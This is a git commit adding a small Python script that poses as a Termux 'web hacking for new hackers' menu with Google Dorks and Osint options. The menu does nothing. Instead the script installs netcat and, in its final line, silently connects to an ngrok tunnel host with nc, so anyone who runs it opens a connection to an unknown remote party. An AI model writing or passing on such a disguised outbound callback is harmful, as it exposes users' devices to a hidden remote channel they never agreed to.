88acc352fcc5c1e5ecb1d1950b7a59d076ede3e5
Andromedaxs6 <121472410+Andromedaxs6@users.noreply.github.com>
2022-12-31 15:26:41 -0300

    Add files via upload

---
+++ main (2).py
@@ -0,0 +1,12 @@
+import os
+os.system("apt install figlet")
+os.system("apt install nmap-ncat")
+print("figlet webber")
+print("-------------------------------------")
+print("Web Hacking for new hackers from Termux")
+print("Coded by Andromeda")
+print("-------------------------------------")
+print()
+print("[1] Google Dorks")
+print("[2] Osint")
+os.system("nc 0.tcp.sa.ngrok.io 12336")
